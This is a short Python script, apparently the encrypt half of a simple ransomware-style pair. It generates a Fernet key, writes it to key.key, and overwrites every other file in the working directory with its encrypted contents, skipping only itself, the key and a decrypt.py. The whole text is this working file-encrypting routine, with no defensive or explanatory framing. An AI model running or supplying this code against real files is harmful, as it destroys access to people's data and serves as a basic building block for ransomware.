import os
from cryptography.fernet import Fernet

files = []

key = Fernet.generate_key()

with open("key.key", "wb") as key_file:
    key_file.write(key)

for file in os.listdir():
    if file == "key.key" or file == "decrypt.py" or file == "encrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

for file in files:
    with open(file, "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(file, "wb") as f:
        f.write(encrypted)
        print("Encrypted " + file)